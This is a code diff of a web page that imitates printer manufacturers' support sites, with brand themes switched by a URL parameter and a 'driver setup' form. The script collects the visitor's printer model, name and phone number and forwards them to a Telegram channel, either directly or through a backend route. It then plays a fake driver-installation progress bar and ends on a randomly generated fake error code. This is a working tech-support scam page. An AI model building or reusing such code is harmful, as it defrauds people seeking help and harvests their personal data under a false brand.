@@ -439,55 +439,56 @@
     </div>
   </div>
 
-  <script>
-    const brandConfigs = {
-      br: { shortWord: 'BR', logoImg: '/images/B-Logo.png', primaryBg: '#003399', buttonBg: '#E53E3E', buttonHover: '#C53030', navItems: ['Mono Laser', 'Color Laser', 'Inkjet', 'Label Printers', 'Supplies', 'Support & Downloads'], heroPrinterImg: '/images/B-Hero.png', heroBgImg: '/images/B-Hero-Bg.jpg', modelFinderImg: '/images/B-Model.png', footerImg: '/images/B-Footer.jpg' },
-      h: { shortWord: 'H', logoImg: '/images/H-Logo.svg', primaryBg: '#0096D6', buttonBg: '#222222', buttonHover: '#444444', navItems: ['LaserJet', 'OfficeJet', 'Envy', 'DesignJet', 'Supplies', 'Support'], heroPrinterImg: '/images/H-Hero.png', heroBgImg: '/images/H-Hero-Bg.jpg', modelFinderImg: '/images/H-Model.png', footerImg: '/images/H-Footer.jpg' },
-      ca: { shortWord: 'CA', logoImg: '/images/C-Logo.png', primaryBg: '#C30010', buttonBg: '#0091FF', buttonHover: '#0077E2', navItems: ['Maxify', 'Laser', 'Selphy', 'Supplies', 'Projectors', 'Label Printer', 'ink'], heroPrinterImg: '/images/C-Hero.png', heroBgImg: '/images/C-Hero-Bg.jpg', modelFinderImg: '/images/C-Model.png', footerImg: '/images/C-Footer.png' },
-      ep: { shortWord: 'EP', logoImg: '/images/E-Logo.png', primaryBg: '#0054A6', buttonBg: '#0085FF', buttonHover: '#006ACC', navItems: ['EcoTank', 'WorkForce', 'Expression', 'Supplies', 'Projectors', 'Scanners'], heroPrinterImg: '/images/E-Hero.png', heroBgImg: '/images/E-Hero-Bg.jpg', modelFinderImg: '/images/E-Model.png', footerImg: '/images/E-Footer.jpg' }
-    };
+<script>
+  const brandConfigs = {
+    br: { shortWord: 'BR', logoImg: '/images/B-Logo.png', primaryBg: '#003399', buttonBg: '#E53E3E', buttonHover: '#C53030', navItems: ['Mono Laser', 'Color Laser', 'Inkjet', 'Label Printers', 'Supplies', 'Support & Downloads'], heroPrinterImg: '/images/B-Hero.png', heroBgImg: '/images/B-Hero-Bg.jpg', modelFinderImg: '/images/B-Model.png', footerImg: '/images/B-Footer.jpg' },
+    h: { shortWord: 'H', logoImg: '/images/H-Logo.svg', primaryBg: '#0096D6', buttonBg: '#222222', buttonHover: '#444444', navItems: ['LaserJet', 'OfficeJet', 'Envy', 'DesignJet', 'Supplies', 'Support'], heroPrinterImg: '/images/H-Hero.png', heroBgImg: '/images/H-Hero-Bg.jpg', modelFinderImg: '/images/H-Model.png', footerImg: '/images/H-Footer.jpg' },
+    ca: { shortWord: 'CA', logoImg: '/images/C-Logo.png', primaryBg: '#C30010', buttonBg: '#0091FF', buttonHover: '#0077E2', navItems: ['Maxify', 'Laser', 'Selphy', 'Supplies', 'Projectors', 'Label Printer', 'ink'], heroPrinterImg: '/images/C-Hero.png', heroBgImg: '/images/C-Hero-Bg.jpg', modelFinderImg: '/images/C-Model.png', footerImg: '/images/C-Footer.png' },
+    ep: { shortWord: 'EP', logoImg: '/images/E-Logo.png', primaryBg: '#0054A6', buttonBg: '#0085FF', buttonHover: '#006ACC', navItems: ['EcoTank', 'WorkForce', 'Expression', 'Supplies', 'Projectors', 'Scanners'], heroPrinterImg: '/images/E-Hero.png', heroBgImg: '/images/E-Hero-Bg.jpg', modelFinderImg: '/images/E-Model.png', footerImg: '/images/E-Footer.jpg' }
+  };
 
-    const guideSections = [
-      { id: "not-printing", icon: "printer", title: "Printer Not Printing", symptom: "You send a job but nothing comes out — printer is on, no errors shown.", content: [{ heading: "Clear the print queue", body: "Windows: Control Panel → Devices and Printers → right-click printer → See what's printing → cancel every job. Mac: System Settings → Printers & Scanners → Open Print Queue → delete all." }, { heading: "Take the printer back online", body: "Windows: right-click printer → uncheck 'Use Printer Offline'. This resolves roughly 40% of cases." }], tip: "Restart both printer and computer before anything else." }
-    ];
+  const guideSections = [
+    { id: "not-printing", icon: "printer", title: "Printer Not Printing", symptom: "You send a job but nothing comes out — printer is on, no errors shown.", content: [{ heading: "Clear the print queue", body: "Windows: Control Panel → Devices and Printers → right-click printer → See what's printing → cancel every job. Mac: System Settings → Printers & Scanners → Open Print Queue → delete all." }, { heading: "Take the printer back online", body: "Windows: right-click printer → uncheck 'Use Printer Offline'. This resolves roughly 40% of cases." }], tip: "Restart both printer and computer before anything else." }
+  ];
 
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
-    const installingMessages = ["Installing drivers, please wait...", "Configuring printer settings...", "Downloading necessary files...", "Finalizing installation..."];
+  const installingMessages = ["Installing drivers, please wait...", "Configuring printer settings...", "Downloading necessary files...", "Finalizing installation..."];
 
-    let detectedBrand = 'ca';
-    let connectionType = null;
-    let progressIntervalTimer = null;
-    let executionTimeoutTimer = null;
-    let activeAccordionId = null;
+  let detectedBrand = 'ca';
+  let connectionType = null;
+  let progressIntervalTimer = null;
+  let executionTimeoutTimer = null;
+  let activeAccordionId = null;
 
-    function generateErrorCode() { return `ERR-${Math.floor(1000 + Math.random() * 9000)}-PRINTER`; }
+  function generateErrorCode() { return `ERR-${Math.floor(1000 + Math.random() * 9000)}-PRINTER`; }
 
-    function parseSystemRouteContext() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const queryBrand = urlParams.get('brand');
-      
-      if (queryBrand && brandConfigs[queryBrand.toLowerCase()]) {
-        detectedBrand = queryBrand.toLowerCase();
-      }
-      applyDynamicVendorTheme();
+  function parseSystemRouteContext() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const queryBrand = urlParams.get('brand');
+    
+    if (queryBrand && brandConfigs[queryBrand.toLowerCase()]) {
+      detectedBrand = queryBrand.toLowerCase();
     }
+    applyDynamicVendorTheme();
+  }
 
-    function applyDynamicVendorTheme() {
-      const currentBrand = brandConfigs[detectedBrand];
-      document.getElementById('brand-logo').src = currentBrand.logoImg;
-      document.getElementById('hero-bg').style.backgroundImage = `url(${currentBrand.heroBgImg})`;
-      document.getElementById('hero-printer-img').src = currentBrand.heroPrinterImg;
-      document.getElementById('model-finder-img').src = currentBrand.modelFinderImg;
-      document.getElementById('footer-img').src = currentBrand.footerImg;
-      document.getElementById('hero-banner').style.backgroundColor = currentBrand.primaryBg;
+  function applyDynamicVendorTheme() {
+    const currentBrand = brandConfigs[detectedBrand];
+    document.getElementById('brand-logo').src = currentBrand.logoImg;
+    document.getElementById('hero-bg').style.backgroundImage = `url(${currentBrand.heroBgImg})`;
+    document.getElementById('hero-printer-img').src = currentBrand.heroPrinterImg;
+    document.getElementById('model-finder-img').src = currentBrand.modelFinderImg;
+    document.getElementById('footer-img').src = currentBrand.footerImg;
+    document.getElementById('hero-banner').style.backgroundColor = currentBrand.primaryBg;
 
-      const heroBtn = document.querySelector('.hero-btn');
+    const heroBtn = document.querySelector('.hero-btn');
+    if (heroBtn) {
       heroBtn.style.backgroundColor = currentBrand.buttonBg;
       heroBtn.onmouseover = () => heroBtn.style.backgroundColor = currentBrand.buttonHover;
       heroBtn.onmouseout = () => heroBtn.style.backgroundColor = currentBrand.buttonBg;
+    }
 
-      const navContainer = document.getElementById('navbar-links');
+    const navContainer = document.getElementById('navbar-links');
+    if (navContainer) {
       navContainer.innerHTML = '';
       currentBrand.navItems.forEach(item => {
         const link = document.createElement('span');
@@ -495,75 +496,109 @@
         navContainer.appendChild(link);
       });
     }
+  }
 
-    function setModalStep(step) {
-      document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('is-active'));
-      const target = document.getElementById(`step-${step}`);
-      if (target) target.classList.add('is-active');
+  function setModalStep(step) {
+    document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('is-active'));
+    const target = document.getElementById(`step-${step}`);
+    if (target) target.classList.add('is-active');
 
-      const modelNum = document.getElementById('mainModelInput').value.trim();
-      const brandWord = brandConfigs[detectedBrand].shortWord;
+    const modelNum = document.getElementById('mainModelInput').value.trim();
+    const brandWord = brandConfigs[detectedBrand].shortWord;
 
-      if (step === 'select') {
-        document.getElementById('step-select-instruction').textContent = modelNum ? `Select your connection type for ${brandWord} ${modelNum}:` : `Select your connection type:`;
-      } else if (step === 'details') {
-        document.getElementById('step-details-instruction').textContent = `Please enter your details for ${connectionType} setup:`;
-        document.getElementById('modal-model-field-container').style.display = modelNum ? 'none' : 'block';
-        if (modelNum) document.getElementById('modalModelInput').removeAttribute('required');
-        else document.getElementById('modalModelInput').setAttribute('required', 'true');
-      }
+    if (step === 'select') {
+      document.getElementById('step-select-instruction').textContent = modelNum ? `Select your connection type for ${brandWord} ${modelNum}:` : `Select your connection type:`;
+    } else if (step === 'details') {
+      document.getElementById('step-details-instruction').textContent = `Please enter your details for ${connectionType} setup:`;
+      document.getElementById('modal-model-field-container').style.display = modelNum ? 'none' : 'block';
+      if (modelNum) document.getElementById('modalModelInput').removeAttribute('required');
+      else document.getElementById('modalModelInput').setAttribute('required', 'true');
+    }
+  }
+
+  function openSetupModal() { document.getElementById('setupModal').style.display = 'flex'; setModalStep('select'); }
+  
+  function closeSetupModal() {
+    if (progressIntervalTimer) clearInterval(progressIntervalTimer);
+    if (executionTimeoutTimer) clearTimeout(executionTimeoutTimer);
+    document.getElementById('setupModal').style.display = 'none';
+    document.getElementById('mainModelInput').value = '';
+    document.getElementById('modalModelInput').value = '';
+    document.getElementById('modalNameInput').value = '';
+    document.getElementById('modalPhoneInput').value = '';
+    updateProgressBarWidth(0);
+  }
+  
+  function handleBackdropClick(e) { if (e.target.id === 'setupModal') closeSetupModal(); }
+  function handleMainFormSubmit(e) { e.preventDefault(); openSetupModal(); }
+  function selectConnectionType(type) { connectionType = type; setModalStep('details'); }
+  function updateProgressBarWidth(p) { document.getElementById('progress-percentage-txt').textContent = `${p}%`; document.getElementById('progress-bar-fill').style.width = `${p}%`; }
+
+  async function handleDetailsFormSubmit(e) {
+    e.preventDefault();
+
+    const brandWord = brandConfigs[detectedBrand].shortWord;
+    const model =
+        document.getElementById("mainModelInput").value.trim() ||
+        document.getElementById("modalModelInput").value.trim() ||
+        "Not provided";
+
+    const name = document.getElementById("modalNameInput").value.trim();
+    const phone = document.getElementById("modalPhoneInput").value.trim();
+
+    const payload = `🖨️ <b>New Printer Driver Request</b>
+
+🏷️ <b>Brand:</b> ${brandWord}
+🔢 <b>Model:</b> ${model}
+🔗 <b>Connection:</b> ${connectionType}
+👤 <b>Name:</b> ${name}
+📞 <b>Phone:</b> ${phone}`;
+
+    try {
+        const response = await fetch("/api/telegram", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                text: payload,
+            }),
+        });
+
+        if (!response.ok) {
+            throw new Error("Telegram request failed");
+        }
+    } catch (err) {
+        console.error("Telegram Error:", err);
     }
 
-    function openSetupModal() { document.getElementById('setupModal').style.display = 'flex'; setModalStep('select'); }
-    function closeSetupModal() {
-      if (progressIntervalTimer) clearInterval(progressIntervalTimer);
-      if (executionTimeoutTimer) clearTimeout(executionTimeoutTimer);
-      document.getElementById('setupModal').style.display = 'none';
-      document.getElementById('mainModelInput').value = '';
-      document.getElementById('modalModelInput').value = '';
-      document.getElementById('modalNameInput').value = '';
-      document.getElementById('modalPhoneInput').value = '';
-      updateProgressBarWidth(0);
-    }
-    
-    function handleBackdropClick(e) { if (e.target.id === 'setupModal') closeSetupModal(); }
-    function handleMainFormSubmit(e) { e.preventDefault(); openSetupModal(); }
-    function selectConnectionType(type) { connectionType = type; setModalStep('details'); }
-    function updateProgressBarWidth(p) { document.getElementById('progress-percentage-txt').textContent = `${p}%`; document.getElementById('progress-bar-fill').style.width = `${p}%`; }
+    document.getElementById("installing-msg").textContent =
+        installingMessages[Math.floor(Math.random() * installingMessages.length)];
 
-    async function handleDetailsFormSubmit(e) {
-      e.preventDefault();
-      const brandWord = brandConfigs[detectedBrand].shortWord;
-      const model = document.getElementById('mainModelInput').value.trim() || document.getElementById('modalModelInput').value.trim() || 'Not provided';
-      const name = document.getElementById('modalNameInput').value.trim();
-      const phone = document.getElementById('modalPhoneInput').value.trim();
+    setModalStep("installing");
 
-      const payload = `🖨️ <b>New Printer Driver Request</b>\n\n🏷️ <b>Brand:</b> ${brandWord}\n🔢 <b>Model:</b> ${model}\n🔗 <b>Connection:</b> ${connectionType}\n👤 <b>Name:</b> ${name}\n📞 <b>Phone:</b> ${phone}`;
+    let currentStep = 0;
+    const steps = 100;
 
-      if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
-        try {
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: payload, parse_mode: 'HTML' }) });
-        } catch (err) { console.error(err); }
-      }
-
-      document.getElementById('installing-msg').textContent = installingMessages[Math.floor(Math.random() * installingMessages.length)];
-      setModalStep('installing');
-
-      let currentStep = 0; const steps = 100;
-      progressIntervalTimer = setInterval(() => {
+    progressIntervalTimer = setInterval(() => {
         currentStep++;
         updateProgressBarWidth(Math.min(100, currentStep));
-        if (currentStep >= steps) clearInterval(progressIntervalTimer);
-      }, 200);
 
-      executionTimeoutTimer = setTimeout(() => {
+        if (currentStep >= steps) {
+            clearInterval(progressIntervalTimer);
+        }
+    }, 200);
+
+    executionTimeoutTimer = setTimeout(() => {
         clearInterval(progressIntervalTimer);
-        document.getElementById('error-code-display').textContent = generateErrorCode();
-        setModalStep('error');
-      }, 20000);
-    }
+        document.getElementById("error-code-display").textContent = generateErrorCode();
+        setModalStep("error");
+    }, 20000);
+  }
 
-    const accordionContainer = document.getElementById("accordion-container");
+  // Generate Accordion Items DOM Tree
+  const accordionContainer = document.getElementById("accordion-container");
+  if (accordionContainer) {
     guideSections.forEach((section) => {
       const itemNode = document.createElement("div");
       itemNode.className = "accordion-item";
@@ -580,18 +615,27 @@
         <div class="accordion-content-wrapper"><div class="accordion-inner-content"><div class="content-padding"><div class="steps-space">${stepsHTML}</div></div></div></div>`;
       accordionContainer.appendChild(itemNode);
     });
+  }
 
-    function toggleAccordion(id) {
-      const target = document.getElementById(`accordion-${id}`);
-      if (activeAccordionId === id) { target.classList.remove("is-open"); activeAccordionId = null; }
-      else {
-        if (activeAccordionId) document.getElementById(`accordion-${activeAccordionId}`).classList.remove("is-open");
-        target.classList.add("is-open"); activeAccordionId = id;
-      }
+  function toggleAccordion(id) {
+    const target = document.getElementById(`accordion-${id}`);
+    if (activeAccordionId === id) { 
+      target.classList.remove("is-open"); 
+      activeAccordionId = null; 
+    } else {
+      if (activeAccordionId) document.getElementById(`accordion-${activeAccordionId}`).classList.remove("is-open");
+      target.classList.add("is-open"); 
+      activeAccordionId = id;
     }
+  }
 
-    window.onload = function() { parseSystemRouteContext(); if (typeof lucide !== 'undefined') { lucide.createIcons(); } };
-  </script>
+  window.onload = function() { 
+    parseSystemRouteContext(); 
+    if (typeof lucide !== 'undefined') { 
+      lucide.createIcons(); 
+    } 
+  };
+</script>
 
   <!-- Start of LiveChat (www.livechat.com) code -->
 <script>
